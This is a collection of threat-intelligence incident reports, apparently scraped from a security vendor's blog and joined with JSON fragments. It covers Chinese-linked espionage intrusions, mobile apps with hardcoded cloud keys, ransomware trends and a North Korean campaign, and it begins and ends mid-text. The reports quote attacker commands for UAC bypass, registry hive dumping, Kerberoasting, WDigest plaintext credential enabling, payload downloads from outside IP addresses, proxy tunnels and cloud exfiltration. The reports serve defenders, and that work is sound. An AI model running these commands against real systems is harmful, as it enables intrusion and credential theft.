ransomware was used to cover up evidence of the intrusion or act as a decoy to draw attention away from the true nature of the espionage attacks. However, the ransomware deployment was not very effective at covering up the tools used in the intrusion, particularly those linking it back to prior espionage attacks. Secondly, the ransomware target was not a strategically significant organization and was something of an outlier compared to the espionage targets. It seems unusual that the attacker would go to such lengths to cover up the nature of their campaign. Finally, the attacker seemed to be serious about collecting a ransom from the victim and appeared to have spent time corresponding with them. This usually wouldn’t be the case if the ransomware attack was simply a diversion. The most likely scenario is that an actor, possibly one individual, was attempting to make some money on the side using their employer’s toolkit.

    "content": "Threat actors using tools linked to China-based APT groups have targeted multiple high-profile organizations in Southeast Asia, including government ministries in two different countries, an air traffic control organization, a telecoms company, and a media outlet. The attacks, which have been underway since at least October 2023, appear to have intelligence gathering as their main goal. The attackers use a variety of both open-source and living-off-the-land tools in their operations. While attribution to a specific threat group cannot be determined, multiple tools used in the campaign have links to several China-based actors (see Tools section for details). Of note is the use of a proxy tool called Rakshasa and a legitimate application file used for DLL sideloading, both of which wereused previously by the Chinese advanced persistent threat (APT) group known as Earth Baku(aka APT41, Brass Typhoon). A typical attack involves the use of a remote access tool that leverages Impacket to execute commands via WMI (Windows Management Instrumentation). The attackers then install keyloggers, password collectors, and reverse proxy tools (Rakshasa, Stowaway, ReverseSSH) to maintain connections to attacker-controlled infrastructure. The threat actors also install customized DLL files that act as authentication mechanism filters, allowing them to intercept login credentials. The threat actors used the following tools. However, the list of tools used in each attack varied and not all of the following were used in every attack. Dismap:An open-sourceasset discovery and identification tool. FastReverseProxy:FRP is an open-sourced toolused to expose local servers to the public internet. file.io exfiltration:Commands used by the attackers suggests data gathered during a successful attack is exfiltrated to the legitimate file-sharing website file.io. Impacket:An open-sourcecollection of moduleswritten in Python for programmatically constructing and manipulating network protocols. It contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks. Infostealer:An information-collection tool that creates a hidden folder named AppCache and file named AppCache.dat in C:\\Users\\[CURRENT USER]\\AppData\\Local\\Microsoft\\Windows\\AppCache\\AppCache.dat. It then encrypts and logs gathered information into AppCache.dat. Inveigh:A cross-platform .NET IPv4/IPv6machine-in-the-middle toolfor penetration testers. The tool can be used to conduct spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. Keylogger:The attackers install customized DLL files that act as authentication mechanism filters, effectively allowing them to intercept login credentials from users who physically log in to the machine. Legitimate applications abused for DLL sideloading:The attackers used a legitimate application file (Bitdefender Crash Handler) from 2011 for DLL sideloading. This file wasused previouslyin multiple attacks, some of which werelinked tothe Chinese APT group known as Earth Baku (aka APT41, Brass Typhoon). Living off the land:The attackers also made use of several living-off-the-land tools, including: NBTScan:An open-source command-lineNetBIOS scanner. PlugX (Korplug):A remote access Trojan (RAT) that can download additional plugins to enhance its capability beyond information gathering. The malware was initially associated solely with multiple Chinese state-backed threat actors, including Budworm (aka APT27, Emissary Panda, Lucky Mouse) and Fireant (aka Mustang Panda, APT31, Stately Taurus). However, a range of other threat actors outside of China have used the malware since its source code was allegedly leaked in 2015. Rakshasa:A proxy tool written in Go, designed specifically for multi-level proxying and internal network penetration. The tool has beenused previously by Earth Baku. In addition, the language used in the tool is simplified Chinese. ReverseSSH:A statically linkedSSH serverwith reverse shell functionality. SharpGPOAbuse:A.NET applicationwritten in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO. SharpNBTScan:A NetBIOSscanning toolwritten in C#. The tool wasused previouslyby the China-linked APT group known as Fireant (aka Mustang Panda, APT31, Stately Taurus). Stowaway Proxy Tool:Apublicly available multi-hop proxy toolthat allows users to easily proxy their network traffic to intranet nodes. TightVNC:Open-sourceremote desktop software. WinRAR:Anarchive managerthat can be used to archive or zip files – for example, prior to exfiltration. The following activity occurred on one of the targeted organizations’ networks. In this instance, the attackers remained active for at least three months, between June and August 2024, focusing on intelligence gathering—specifically collecting and likely exfiltrating data of interest. While this case highlights a particular approach, in other attacks, the threat actors employed additional tactics, techniques, and procedures (TTPs), such as DLL sideloading, and leveraged tools like Rakshasa and SharpGPOAbuse, among others, to achieve their objectives. The first indication of malicious activity within this organization was on May 27 at 14:15 local time, where a suspicious PowerShell command was executed. The command was used to modify the registry, specifically the system policies, to enable 'LocalAccountTokenFilterPolicy'. This value is responsible for controlling how local accounts are filtered when they are used to access a Windows system remotely. By setting the key to value '1', it effectively disables Remote UAC filtering for local accounts, allowing local admin accounts to use elevated tokens (with full admin rights when connecting remotely). At 14:18, another suspicious command was executed via the WMI service: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1716819456.018484 2>&1 This pipe naming convention typically indicates a remote tool leveraging Impacket is being used to execute the commands (also corroborated via process lineage). This is a common command observed as part of tooling used in lateral movement such as wmiexec. At 14:22, several additional discovery commands were executed: These commands were used to display wireless network profile information, including network names for any wireless network that was connected to in the past. The net share command lists any available network shares. The netstat command lists all active (established and listening) TCP connections on the machine. The next day on May 28 at 12:51, another suspicious command was executed via WMI: cmd.exe /Q /c move ChromeUpdate.dat ChromeUpdate.exe 1> \\\\127.0.0.1\\ADMIN$\\__1716900555.2954416 2>&1 The command was used to rename a likely uploaded file called ChromeUpdate.dat (SHA-256: 8b6d081be732743aa6f6bccfb68b3f21878aa36723c1311f50406d752aacc9fa) to ChromeUpdate.exe. Next, the file was executed, passing ‘install' as a command-line argument: ChromeUpdate.exe /install The file contained an encrypted embedded keylogger payload for 64-bit systems. At 13:07, several suspicious registry edits and scheduled task-related commands were executed: reg add hklm\\software\\microsoft\\windows\\CurrentVersion\\run /v mscorsvc /t REG_EXPAND_SZ /d \"\\\"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\"\" /f schtasks /create /sc once /st 23:59 /ru \"[REMOVED]\" /tn autorun /tr \"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\" /F schtasks /run /tn autorun These commands were used to create a run key for a file called mscorsvw.exe in the registry using the run key name 'mscorsvc' – this will launch the file every time the system boots. The schtasks command creates a scheduled task called 'autorun' under the user '[REMOVED]' and is configured to run only once at 23:59 on the same day. Directly after this, schtasks was executed to launch the autorun (i.e. mscorsvw.exe) task. At 13:13, another scheduled task was created for a different file: schtasks /create /sc once /st 23:59 /ru \"[REMOVED]\" /tn autorun /tr \"CSIDL_SYSTEMX86\\wbem\\wintulxs.exe -c 38.60.146.78:443 -s 1qaz2wsx4rfv -reconnect 10\" /F This task was scheduled to run once at 23:59 on the same day using the task name 'autorun' to execute a file called 'wintulxs.exe' (SHA-256: d312b0e1968beae5a2ff3be2d8efc6d1bfdab3b1aec6faf8eafa295c47230194). This tool is a freely available Chinese proxy tool calledStowaway, which is described as providing the ability to “proxy external traffic through multiple nodes to the core internal network, breaking through internal network access restrictions.” On May 30 at 03:16, the attackers returned and executed a series of ‘net’ commands to list network share sessions and available shares, and to view available shares on remote hosts. The attackers also mounted network shares. Directly afterwards, the ‘fsutil’ command was executed to list all available file system drives (e.g. C:). net view \\\\192.168.21.65 net use [REMOVED]\\\\192.168.21.108/u:[REMOVED] net use [REMOVED]/d/y net use [REMOVED]\\\\192.168.21.61/u:[REMOVED] At the time of the initial attacker activity on May 27 at 13:41, additional suspicious activity was also observed on another machine. Similar commands to those previously observed were executed as a means to bypass UAC. This time, the commands were executed via TightVNC. reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f net localgroup [REMOVED] [REMOVED] /add reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f At 15:08, another suspicious reg.exe command was executed: \"CSIDL_SYSTEM\\reg.exe\" add \"hklm\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v [REMOVED] /t REG_DWORD /d 0 /f This command was used to modify the Windows registry, specifically to hide a specific account from displaying in the user list during user login. Shortly after at 15:10, the attackers returned and dumped passwords from the registry: cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1716822622.7074058 2>&1 reg save hklm\\sam sam.hive reg save hklm\\system system.hive cmd.exe /Q /c dir /on CSIDL_PROGRAM_FILES\\winrar\\rar.exe 1> \\\\127.0.0.1\\ADMIN$\\__1716822622.7074058 2>&1 The attackers also checked that WinRAR was installed in the default path, likely using it to collect and later exfiltrate the hive files. On May 28 at 13:51, the attackers used WMI to launch a command prompt. The next day at13:52, the attackers returned and copied an unknown file that masquerades as part of the .NET framework. CSIDL_WINDOWS\\microsoft.net\\framework\\v4.0.30319\\mscorsvw.exe → CSIDL_SYSTEM_DRIVE\\progra~2\\microsoft.net\\redistlist\\mscorsvw.exe. Directly after this, the attackers proceeded to create registry run keys and scheduled a task to execute the sample at 23:59: reg add hklm\\software\\microsoft\\windows\\CurrentVersion\\run /v mscorsvc /t REG_EXPAND_SZ /d \"\\\"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\"\" /f schtasks /create /sc once /st 23:59 /ru \"[REMOVED]\" /tn autorun /tr \"CSIDL_PROGRAM_FILESX86\\microsoft.net\\redistlist\\mscorsvw.exe\" /F schtasks /run /tn autorun Finally, the attackers used schtasks to launch the autorun service, executing mscorsvw.exe. Later, on August 20, the attackers installed a ReverseSSH tool – winupdateser.exe (SHA-256: 779b4a5f53d3128ab53dd8e13c362d6d077c3eb4987f878d7ef3416c801ef0dd). Following this, at 07:32, the attackers created a scheduled task on a remote system to execute an unknown Windows batch file (net.bat) at 15:35 using the task name 'Microsoft\\windows\\TaskScheduler\\Maintenance': schtasks /create /s [REMOVED] /u [REMOVED] /p [REMOVED] /tn \"Microsoft\\windows\\TaskScheduler\\Maintenance\" /tr \"CSIDL_SYSTEM\\net.bat\" /sc once /st 15:35 Shortly afterward, WMI was used to execute ‘ChromeUpdate.exe /install’ in order to install a keylogger. At 08:11, WMI was used to execute ‘ipconfig /all >> %TEMP%\\cc.dat’ to collect network configuration information. On September 4, the attackers returned and created multiple scheduled tasks to execute unknown Windows batch files using the task name 'Microsoft\\windows\\TaskScheduler\\Maintenance' on multiple machines: schtasks /create /s [REDACTED] /u [REMOVED] /p [REMOVED] /tn \"Microsoft\\windows\\TaskScheduler\\Maintenance\" /tr \"CSIDL_WINDOWS\\temp\\[REDACTED]udpate.bat\" /sc once /st 15:58 On August 6 at 12:21, the attackers accessed another machine where they executed a script (ime.bat) in order to install a new authentication mechanism called Win32Pro. reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos /v Auth0 /t REG_SZ /d \"Win32Pro\" /f >>c:\\windows\\ime\\ime.log REG QUERY \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Notification Packages\" >>c:\\windows\\ime\\ime.log REG QUERY \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" >>c:\\windows\\ime\\ime.log Following the installation, the attackers launched a file named ‘win32pro.dll’ (SHA-256: 89707a5bf9862a9effb1618a1a285a8d027fb343f6103f4bc68f736889f0a86e) via another file called rpc2.exe (SHA-256: e0f3b8028a2969e280efdd770978a54181fc242dd26cbf0a22e922f1e6a1b951). CSIDL_SYSTEM\\rpc2.exe CSIDL_SYSTEM\\win32pro.dll The file ‘win32pro.dll’ was used to capture and collect user login information including the current time, domain name, username, machine name, and password. Captured credentials were stored in the following locations using the RC4 encryption algorithm with the key \"rfvfsj\": During the course of these operations, the attackers conducted exfiltration activities within targeted organizations. They maintained prolonged access to these networks, often spanning several months, while operating covertly to avoid detection. During this time, they focused on harvesting credentials, including passwords, and mapping the network to identify systems of interest. Exfiltration was carried out through a combination of tactics, including the collection of files of interest using WinRAR, which were subsequently compressed into password-protected archives. These archives were then uploaded to cloud storage services such as File.io, enabling the attackers to stealthily exfiltrate sensitive data while minimizing the risk of exposure. This extended dwell time and calculated approach underscore the sophistication and persistence of the threat actors.

Tools leveraged in these attacks have been used by Chinese state-backed groups such as Fireant (aka Mustang Panda, APT31, Stately Taurus),  Earth Baku (aka APT41, Brass Typhoon), Budworm (aka APT27, Emissary Panda, Lucky Mouse), and others. However, due to many of these groups frequently sharing tools and using similar TTPs, specific attribution in this case is not possible.

    "content": "A large U.S. organization with a significant presence in China was the subject of a targeted attack earlier this year, during which the attackers obtained a persistent presence on its network, seemingly for the purpose of intelligence gathering. The attack was likely carried out by a China-based threat actor, since some of the tools used in this attack have been previously associated with Chinese attackers. While it is possible that actual network intrusion occurred earlier, the first evidence of the attacker’s activity dates from April 2024, and this malicious activity continued until August 2024. The attackers moved laterally across the organization’s network, compromising multiple computers. Some of the machines targeted were Exchange Servers, suggesting the attackers were gathering intelligence by harvesting emails. Exfiltration tools were also deployed, suggesting that targeted data was taken from the organizations. DLL-sideloading:The attackers used several legitimate applications to load malware, a technique known as DLL-sideloading, where the attackers use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious DLL payload. In this case, several Google and Apple applications were used to perform sideloading (GoogleToolbarNotifier.exe and iTunesHelper.exe). Impacket: An open-sourcecollection of moduleswritten in Python, a general purpose programming language, for programmatically constructing and manipulating network protocols. It contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks. FileZilla: Anopen-source FTP client and serveravailable for Windows, Linux, and macOS. PSCP: ASecure Copy Protocol (SCP) clientcreated by the same developers as the PuTTY SSH client. Living off the land:The attackers also leveraged several living-off-the-land tools, including: The initial infection vector remains unknown. However, the first evidence of malicious activity dates from April 11, 2024, when a suspicious command was executed on one computer via WMI, which bore the hallmarks of a tool leveraging Impacket from another machine on the network:cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1712807675.4462686 2>&1 cmd.exe /Q /c cd 1> \\\\127.0.0.1\\ADMIN$\\__1712807675.4462686 2>&1 The fact that the command originated from another machine on the network suggests that the attackers had already compromised at least one other machine on the organization’s network and that the intrusion may have begun prior to April 11. The attackers then attempted to mount a network share using the “net use” command. Next, they dumped credentials from the registry using reg.exe: reg save hklm\\system ss A minute later, they attempted to mount another network share, using the “net use” command, specifically attempting to mount a drive connected to a network attached storage (NAS) device. A few hours later, the attackers returned and ran netstat to check for all open TCP (active and listening) connections. The attackers then executed another encoded PowerShell script, which decoded as: $ProgressPreference=\"SilentlyContinue\";setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } The command queries Active Directory (AD) for service principal names (SPNs), which are accounts associated with services within the AD. The command then processes the output to extract relevant details and then extracts a Kerberos security token for each matching SPN. This is a tactic called Kerberoasting and is used to steal credentials specifically for service accounts, which the attackers likely attempt to crack offline in an effort to gain access to privileged accounts to assist in moving laterally across the network. It is also interesting to note that the domain specified in the above command “medin.local” is the default domain name used in a number of publicly available Kerberoast tools and scripts, suggesting the attackers are directly leveling off-the-shelf tooling without any modifications. The attackers were then observed modifying some of the commands and executing several further PowerShell commands, this time with the correct domain: $ProgressPreference=“SilentlyContinue”;setspn -T [REMOVED] -Q */* $ProgressPreference=“SilentlyContinue”;klist $ProgressPreference=“SilentlyContinue”;klist  tgt The “klist” command lists the current Kerberos tickets for the user, giving visibility into the user's active Kerberos authentication status. Additionally, “tgt” refers to the Ticket Granting Ticket, which is a special type of ticket used to authenticate to the Key Distribution Center (KDC). This is likely targeted by the attackers to obtain other service tickets to attempt to crack offline. On April 16, malicious activity resumed on the same computer when the attackers launched a command prompt via WMI. The next day, they proceeded to execute a file named rc.exe, which is a renamed version of Google’s application GoogleToolbarNotifier. This file was used to sideload a malicious DLL named gtn.dll. Malicious activity began on a second machine, a web server, on June 2, 2024. The attackers again used the change directory command via WMI, with the structure of the command suggesting that Impacket was used: cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1717319212.299007 2>&1 Minutes later, the attackers ran a file named putty.exe. Despite the name, the application is actually the SFTP component of FileZilla, which is based on PuTTY’s Secure File Transfer Protocol (SFTP) client. This was likely installed for data exfiltration purposes. On June 13, the same file was executed multiple times via WMI. The next day (June 14), PowerShell was used to download files from a remote host to the perflogs directory: powershell (new-object System.Net.WebClient).DownloadFile( 'hxxp://149.28.154.23:443/rar.exe','CSIDL_SYSTEM_DRIVE\\perflogs\\rar.exe') powershell (new-object System.Net.WebClient).DownloadFile( 'hxxp://149.28.154.23:443/vmtools.exe','CSIDL_SYSTEM_DRIVE\\perflogs\\vmtools.exe') Although not recovered, rar.exe was likely the command-line version of WinRAR. The file named vmtools.exe was a renamed version of PSCP, the Secure Copy Protocol (SCP) client created by the same developers as PuTTY SSH. Malicious activity on this computer resumed on June 27, when a number of commands were executed, mostly via PsExec. Among the files run was the legitimate Google application GoogleUpdate.exe. Among the suspicious files found on this machine were two named ibnettle-6.dll and textinputhost.dat. It is possible that one or both were malicious files that were sideloaded. Textinputhost.dat was previously reported by Sophos and Recorded Future as being used by the Chinese Crimson Palace group in attacks against targets in Southeast Asia. Malicious activity began on a third machine on June 2, when WMI was used to execute wevtutil to query the Windows Event Log from a remote machine on the network: wevtutil qe security /rd:true /f:text /q:”*[System[(EventID=4624) or (EventID=4672) or (EventID=4634) or (EventID=4673) or (EventID=4740)]] and *[System[TimeCreated[timediff(@SystemTime)<=2592000000]]]” The command was structured to query the security event log for the following events: Immediately afterwards, the attackers ran a PowerShell script via WMI: cmd.exe /Q /c powershell echo ((new-object Net.Sockets.TcpClient).Connect(\\”192.168.92.92\\”,135)) “open!” 1> \\\\127.0.0.1\\ADMIN$\\__1717327352.4534295 2>&1 It is possible that the attackers are using this script to test connectivity back to another computer on the network specifically to confirm if Microsoft’s remote procedure call (RPC) service was available (port 135). The attackers also attempted to connect to the same machine using port 3389 (usually reserved for RDP): powershell echo ((new-object Net.Sockets.TcpClient).Connect(\\”192.168.92.92\\”,3389)) “open!” The attackers returned on June 20 and launched a command prompt via PsExec from another machine on the network (192.168.88.235). Several net commands were then executed: CSIDL_SYSTEM\\net1 group “Exchange Servers” /domain The commands are used to display information pertaining to specific groups of the domain. One group the attackers were particularly interested in is \"Exchange Servers\", suggesting the attackers were attempting to target mail servers to collect and possibly exfiltrate email data. Later in the same day, a suspicious PowerShell command was executed via PsExec: powershell -exec bypass -command “Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate|Format-Table -AutoSize |Out-File -FilePath “ CSIDL_COMMON_APPDATA\\computer.txt -Width ([int]::MaxValue)” The command retrieves all enabled computers from Active Directory along with their name, DNS hostname, operating system, and last logon date. It then formats the information into a table and saves it to a file called computer.txt. Minutes later, the quser command was executed to list all logged in/activate user accounts on the machine. The next day (June 21), the machine was used again to launch a command prompt on another machine on the network: PsExec64.exe \\\\192.168.92.79 -accepteula cmd On June 5, a suspicious command was executed on a fourth computer via WMI: reg.exe export “HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs” CSIDL_WINDOWS\\temp\\ts_2011.tmp The command exports registry key values to a .TMP file. The registry key Control\\Session Manager\\KnownDLLs holds a list of trusted DLLs that the system typically loads from the System32 directory during system boot-up that may be leveraged by other processes. Exporting this key will copy all the registry values associated with these KnownDLLs and may provide information to the attackers on what file names may appear innocuous if reused or, more likely, for the purposes of DLL hijacking. This is a common attack where malicious DLLs are placed in directories to be loaded instead of legitimate system DLLs. One June 13, activity commenced on a fifth machine when a command was executed via WMI to change the directory to the root drive. The attackers then attempted to launch the application iTunesHelper.exe from the PerfLogs directory. This was likely launched to load a malicious DLL (CoreFoundation.dll) using the sideloading technique (we have seen this done many times before with this same binary using CoreFoundation.dll). The available evidence suggests that the organization was breached by a China-based actor. Aside from the fact that DLL sideloading is a widely favored tactic among Chinese groups, the same organization was targeted in 2023 by an attacker with tentative links to the China-based Daggerfly group. The file textinputhost.dat was previously reported bySophosandRecordedFutureas being leveraged by China-based espionage group Crimson Palace in attacks against Southeast Asia. In that case, it was used in conjunction with an executable named rc.exe. The same file name was also used by the attackers who conducted this attack.

    "content": "Mobile apps have become an essential part of our everyday lives, with millions of apps downloads on platforms like the Google Play Store and Apple App Store, a hidden threat has emerged that could put user data and backend services at significant risk. Recent analysis has uncovered a troubling trend: several widely-used apps have been found to contain hardcoded and unencrypted cloud service credentials within their codebases. This dangerous practice means that anyone with access to the app's binary or source code could potentially extract these credentials and misuse them to manipulate or exfiltrate data, leading to severe security breaches. In this blog, we will explore specific examples of these vulnerabilities, focusing on apps that have hardcoded Amazon Web Services (AWS) and Microsoft Azure Blob Storage credentials, and discuss best practices that developers should adopt to prevent such issues. The Pic Stitch: Collage Maker app, with over 5 million downloads on the Google Play Store, has been found to contain hardcoded AWS credentials directly within its code, posing a significant security risk. The code snippet from Jadx (Figure. 1-3) reveals that the app uses the method loadAmazonCredential(boolean z) to load the appropriate credentials depending on the environment. If the boolean flag is set to true, the app loads the production credentials, including the production Amazon S3 bucket name, the read and write access keys, and secret keys. Conversely, if the flag is false, the app loads the corresponding staging credentials. Similarly, the same type of insecure credential management has been uncovered in several popular iOS apps (Figure. 4), all of which have embedded hardcoded and unencrypted AWS credentials within their codebases. Three apps in particular—Crumbl,Eureka: Earn Money for Surveys, andVideoshop - Video Editor—exemplify this widespread problem. With over 3.9 million ratings and ranked number 5 in the Food & Drink category on the Apple Store, Crumbl’s code (Figure. 5) initializes an AWSStaticCredentialsProvider with plain-text credentials, including an access key and secret key. These credentials are used to configure AWS services, leaving them exposed and vulnerable to misuse. Furthermore, the inclusion of a WebSocket Secure (WSS) endpoint within the code—\"wss://***.iot.us-west-2.amazonaws.com\"—highlights a significant security oversight. This endpoint, part of the Amazon API URL, is hardcoded with an API Gateway that directly connects to the IoT services on AWS. Exposing such URLs alongside static credentials makes it easier for attackers to potentially intercept or manipulate communications, leading to unauthorized access to the associated AWS resources. This configuration, without proper encryption or obfuscation, presents a serious risk to the integrity of the application and its backend infrastructure. This app, with 402.1K ratings and ranked 61 in the Lifestyle category, hardcodes AWS credentials directly within its code. (Figure. 6) The app allocates an INMAWSCredentials object and initializes it with the access key and secret key, both stored in plain text. These credentials are used to log events to AWS, exposing critical cloud resources to potential attacks. With 357.9K ratings, Videoshop directly embeds AWS credentials in the -[VSAppDelegate setupS3] method. (Figure. 7) These credentials are not encrypted, meaning anyone with access to the app's binary could easily extract them, gaining unauthorized access to the associated S3 buckets and potentially leading to data theft or manipulation. In all of these example apps, hardcoded credentials are used to authenticate with various AWS services, such as S3 buckets for storage and IoT data management. This common practice of embedding sensitive information like AWS keys directly within the code, without any form of encryption or protection, poses a severe risk. Attackers who gain access to these credentials could exploit them to compromise the app's backend infrastructure, steal user data, or cause service disruptions. A similar security issue has been identified in several popular Android apps (Figure. 8) that have hardcoded and unencrypted Microsoft Azure Blob Storage credentials within their source code. These credentials, embedded directly into the apps' binaries, pose significant risks to both the security and privacy of the apps' users. With over 5 million downloads on the Google Play Store, Meru Cabs hardcoded Azure credentials within the UploadLogs service (Figure. 9), embedding a connection string that includes an account key. This connection string is used to manage log uploads, exposing critical cloud storage resources to potential abuse. This app, with over 500K downloads, embeds multiple hardcoded Azure credentials across its codebase. (Figure. 10) These credentials are used for various purposes, such as adding posts, handling invoices, and storing user profiles. The use of plain-text connection strings to access Azure Blob Storage containers puts sensitive data at significant risk. With over 500K downloads, ReSound Tinnitus Relief also hardcodes its Azure Blob Storage credentials. (Figure. 11) These credentials are used to manage various assets and sound files, and their exposure could lead to unauthorized access and data breaches. These hardcoded credentials not only expose the Azure Blob Storage accounts to unauthorized access but also put user data and backend resources at risk. Anyone with access to the app's binary or source code could potentially extract these credentials and misuse them to manipulate or exfiltrate data, leading to severe security breaches. This repeated pattern of insecure credential management across multiple apps highlights the critical need for developers to adopt more secure practices. The examples highlighted in this blog demonstrate the serious security risks posed by hardcoded and unencrypted cloud service credentials in mobile apps. This practice exposes critical infrastructure to potential attacks, endangering user data and backend services. The widespread nature of these vulnerabilities across both iOS and Android platforms underscores the urgent need for a shift towards more secure development practices. Best Practices for Developers To mitigate these risks, developers should follow best practices for managing sensitive information within their applications: By adopting these best practices, developers can significantly reduce the risk of exposing sensitive information and ensure that their applications are secure against potential threats. As the examples in this blog demonstrate, the stakes are high, and it is imperative that security be a top priority in the mobile app development lifecycle.

    "title": "ransomware threat level remains high",
    "link": "https://www.security.com/threat-intelligence/ransomware-threat-level-remains-high",
    "content": "Ransomware attacks continued to occur at near peak levels during the third quarter of this year, which also saw the newly formed RansomHub group overtake the veteran LockBit operation as the number one ransomware threat. Analysis of data from ransomware leak sites found that ransomware actors claimed 1,255 attacks in the third quarter of 2024, down very slightly from 1,325 in the second quarter, but the overall number of attacks is continuing to trend upwards. The biggest development during the quarter was the decline of LockBit, which was previously the dominant player in the ransomware ecosystem, claiming more than three times more attacks than its nearest rival Qilin in the second quarter. The number of LockBit attacks claimed in the third quarter was 188, down from the 353 attacks claimed in the second quarter. LockBit was the target of aninternational law enforcement operationin February 2024, which impacted its level of activity in the first quarter of this year. By the second quarter, it appeared to recover completely, but it is possible that the operation has led to a loss of trust among LockBit affiliates, particularly since authorities indicated they had collected information that could identify affiliates. The biggest beneficiary of LockBit’s decline was RansomHub,which only became active in February 2024but is now the number one ransomware operation in terms of the number of attacks claimed. RansomHub claimed 191 attacks in the third quarter, up from 75 in the second quarter. The group’s rapid rise may be explained by its success in recruiting experienced affiliates for its ransomware-as-a-service operation, reportedly offering more attractive terms than rival outfits. Another group that stepped up attacks was Qilin (aka Agenda), which claimed 140 attacks in the third quarter, up from 97 in the second quarter. There was once again a significant difference between the overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit still figured highly in the number of claimed attacks, it only accounted for 7% of the attacks investigated by Symantec in the third quarter. While RansomHub accounted for 15% of publicly claimed attacks, it was responsible for a third of the attacks investigated by Symantec, supporting reports that it is signing up experienced affiliate attackers from rival groups. Today’s ransomware attacks are complex multi-stage intrusions that involve the deployment of multiple tools and often a significant amount of hands-on-keyboard activity on the part of the attackers. An analysis of the most frequently seen tools used in ransomware attacks gives some indication of the favored tactics, techniques, and procedures (TTPs) among ransomware actors at present. These tools fall mostly into four categories: Living off the Land:Utilities that are native to the Windows environment that can be leveraged by an attacker. Tools such as PsExec and WMI can be leveraged by attackers to move laterally on networks and execute commands on remote machines. PowerShell, meanwhile, is a powerful scripting tool that can be used to run commands, download payloads, move laterally, and carry out reconnaissance. Impairing Defenses:A growing number of attackers are using tools that leverage the Bring Your Own Vulnerable Driver (BYOD) technique. Attackers will deploy a signed vulnerable driver to the target network and use that driver to kill security software. Drivers are given kernel access, which means that they can be used to kill processes. In most cases, the vulnerable driver is deployed along with a malicious executable, which will use the driver to issue commands. Remote Desktop/Remote Admin:While these software packages are used legitimately for remote administration or tech support, attackers are turning to them because they effectively provide backdoor access to a machine. Tools such as RDP, AnyDesk, Splashtop, and ScreenConnect are frequently deployed by ransomware actors. Data Exfiltration:Most ransomware groups carry out double-extortion attacks, stealing data from a victim’s network prior to encryption and using the threat of leaking that stolen data as an additional form of leverage. Rclone is the most frequently used exfiltration tool. Many of the remote admin packages used by ransomware actors also have exfiltration capabilities. The growth of ransomware operations such as RansomHub and Qilin to rival LockBit isn’t welcome news, as it may make the ransomware ecosystem more robust and less likely to experience major disruption should a dominant operator be taken down or go offline.

    "content": "Symantec’s Threat Hunter Team has found evidence that the North Korean Stonefly group (aka Andariel, APT45, Silent Chollima, Onyx Sleet) is continuing to mount financially motivated attacks against organizations in the U.S., despite being the subject of an indictment and a multi-million dollar reward. Symantec, part ofBroadcom, found evidence of intrusions against three different organizations in the U.S. in August of this year, a month after the indictment was published. While the attackers didn’t succeed in deploying ransomware on the networks of any of the organizations affected, it is likely that the attacks were financially motivated. All the victims were private companies and involved in businesses with no obvious intelligence value. In several of the attacks, Stonefly’s custom malware Backdoor.Preft (aka Dtrack, Valefor) was deployed. This tool is exclusively associated with the group. In addition to this,several Stonefly indicators of compromise recently documented by Microsoftwere found on the compromised networks. The attackers used a fake Tableau certificate documented by Microsoft in addition to two other certificates (see Indicators of Compromise) that appear to be unique to this campaign. Preft:Multi-stage backdoor capable of downloading and uploading files, executing commands, and downloading additional plugins. Preft can support multiple plugin types, including executable files, VBS, BAT, and shellcode. It has multiple persistence modes, including Startup_LNK, Service, Registry, and Task Scheduler. Nukebot:Backdoor capable of executing commands, downloading and uploading files, and taking screenshots. Nukebot has not been associated with Stonefly before; however, its source code was leaked and this is likely how Stonefly obtained the tool. Batch files:The attackers used a malicious batch file to enable plaintext credentials, modifying the registry to add: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 Mimikatz (see below) was then executed to dump credentials. Mimikatz:Publicly availablecredential dumping tool. The attackers used a custom variant of the tool that writes harvested credentials to the file C:\\Windows\\Temp\\KB0722.log. A similar custom variant of Mimikatz found on VirusTotal was linked by Mandiant to Stonefly. Keyloggers: The attackers deployed two distinct keyloggers in their attacks: Sliver:Open-sourcecross-platform penetration testing framework. Chisel:Open-source proxy tool. It creates a TCP/UDP tunnel that is transported over HTTP and secured via SSH. PuTTY:Publicly availableSSH client. Plink: Acommand-line connection toolfor PuTTY Megatools:Acommand line clientfor the Mega.nz cloud storage service. Megatools was used to perform data exfiltration: CSIDL_WINDOWS\\temp\\mt.exe put -u [REMOVED] -p [REMOVED] CSIDL_WINDOWS\\temp\\sig.rar /Root Snap2HTML:Publicly available toolthat takes snapshots of folder structures on a hard drive and saves them as HTML files. FastReverseProxy (FRP):Open-sourced toolto expose local servers to the public internet. On July 25, 